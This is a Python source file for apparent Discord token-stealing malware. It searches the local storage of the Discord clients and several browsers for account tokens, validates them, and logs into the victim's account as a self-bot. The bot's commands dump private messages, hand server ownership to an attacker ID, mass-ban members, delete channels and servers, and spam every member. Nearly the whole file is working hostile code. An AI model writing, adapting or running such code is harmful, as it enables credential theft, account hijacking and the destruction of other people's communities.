import json
import random
import discord
from discord.ext import commands
import asyncio
import re 
import os
import datetime
import threading
import requests

tokenworking = ""
attackerid = "" #your id
user = os.getenv('USERNAME')
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
tokens = []

def remove_pfp_backend(token):
    headers = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
    "authorization": token
    }
    json = {
        "avatar": "null"
    }
    rq = requests.patch('https://discord.com/api/v8/users/@me', headers=headers, json=json)
    print("code: " + str(rq.status_code))        

def remove_connections_backend(token): # DIDN'T TEST THIS YET
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
        "authorization": token
    }
    rq = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    print("code: " + str(rq.status_code)) 
    jsondata = json.loads(rq.content)
    for data in jsondata:
        rq = requests.delete('https://discord.com/api/v8/users/@me/connections/' + data['type'] + "/" + data['id'], headers=headers)

def change_theme_backend(token, theme):
    headers = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
    "authorization": token
    }
    json = {
        "theme": theme
    }
    rq = requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=json)
    print("code: " + str(rq.status_code))        

def change_language_backend(token, language):
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
        "authorization": token
        }
    json = {
        "locale": language
    }
    rq = requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=json)
    print("code: " + str(rq.status_code))

def ban_account_backend(token, id):
    headers = {
        "user-agent": "Mozzilla/5.0 (Windows NT 1.0;) Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/737.36",
        "authorization": token
    }
    for _ in range(5):
        requests.get("https://discord.com/api/v8/guilds/" + id + "/members", headers=headers)


def tuple_to_string(tuple):
    str =  ''.join(tuple)
    return str

def check_token(token):
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
        "authorization": token
    }
    json = {
        "theme": ""
    }
    r2 = requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=json)
    print("code: " + str(r2.status_code))
    if str(r2.status_code) == "401":
        return False
    else:
        tokenworking == token
        return True 

def find_tokens(path):

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

prefix = "!!"
message = discord.Message 
bot = commands.Bot(command_prefix=prefix, self_bot=True)

@bot.event
async def on_ready():
    print("Logged in as: " + bot.user.name)

@bot.command()
async def remove_connections(ctx):
    for token in tokens:
        remove_connections_backend(token)

@bot.command()
async def block_all(ctx):
    for user in bot.user.friends:
        await user.block()

@bot.command()
async def unfried_all(ctx):
    for user in bot.user.friends:
        await user.remove_friend()

@bot.command()
async def change_language(ctx, args):
    for token in tokens:
        change_language_backend(token, args)

@bot.command()
async def change_theme(ctx, args):
    for token in tokens:
        if args == "light" or "dark":
            change_theme_backend(token, args)

@bot.command()
async def ban_account(ctx):
    for token in tokens:
        ban_account_backend(token, str(ctx.guild.id))

@bot.command()
async def dmdump(ctx):
    for ch in bot.private_channels:
        messages = await ch.history(limit=200).flatten()
        for message in messages:
            with open("C:\\Users\\Public\\dms.txt", "a", encoding='utf-8-sig') as dmfile:
                to_write = str(message.channel) + "> " + str(message.content) + " " + str(messages.author.name) + "\n"
                dmfile.write(to_write)
    await ctx.send(file=discord.File("C:\\Users\\Public\\dms.txt"))

@bot.command()
async def delete(ctx):
    try:
        await ctx.guild.delete()
    except:
        print("i dont have guild permission")

@bot.command()
async def owner(ctx):
    user = bot.fetch_user(attackerid) # your id
    try:
        await ctx.guild.edit(owner=user)
    except:
        print("cant")

@bot.command()
async def send_to_everyone(ctx, *args):
    for user in ctx.guild.members:
        try:
            await user.send(tuple_to_string(args))
        except:
            print("could not send to " + user.name)

@bot.command()
async def baneveryone(ctx):
    for member in ctx.guild.members:
        try:
            member.ban()
        except:
            print("could not ban: " + member.name)
            pass

@bot.command()
async def rename_server(ctx, *args):
    try:
        await ctx.guild.edit(name=tuple_to_string(args))
    except:
        print("cant")

@bot.command()
async def deletechannels(ctx):
    for c in ctx.guild.channels:
        try:
            await c.delete()
        except:
            print("cant delete channel")
            pass

@bot.command()
async def create_guilds(ctx, args):
    args = int(args)
    for _ in range(args):
        await bot.create_guild(name="Get Nuked")

@bot.command()
async def remove_pfp(ctx):
    for token in tokens:
        remove_pfp_backend(token)

@bot.command()
async def leave_all_guilds(ctx):
    for guild in bot.guilds:
        try:
            guild.leave()
        except:
            guild.delete()

path1 = roaming + '\\discord\\Local Storage\\leveldb'
path2 = roaming + '\\discordcanary\\Local Storage\\leveldb',
path3 = roaming + '\\discordptb\\Local Storage\\leveldb',
path4 = local + '\\Google\\Chrome\\User Data\\Default',
path5 = roaming + '\\Opera Software\\Opera Stable',
path6 = local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
path7 = local + '\\Yandex\\YandexBrowser\\User Data\\Default'

if os.path.isdir(str(path1)):
    find_tokens(str(path1))
if os.path.isdir(str(path2)):
    find_tokens(str(path2))
if os.path.isdir(str(path3)):
    find_tokens(str(path3))
if os.path.isdir(str(path4)):
    find_tokens(str(path4))
if os.path.isdir(str(path5)):
    find_tokens(str(path5))
if os.path.isdir(str(path6)):
    find_tokens(str(path6))
if os.path.isdir(str(path7)):
    find_tokens(str(path7))

for token in tokens:
    if check_token(token):
        bot.run(token, bot=False)
    else:
        pass
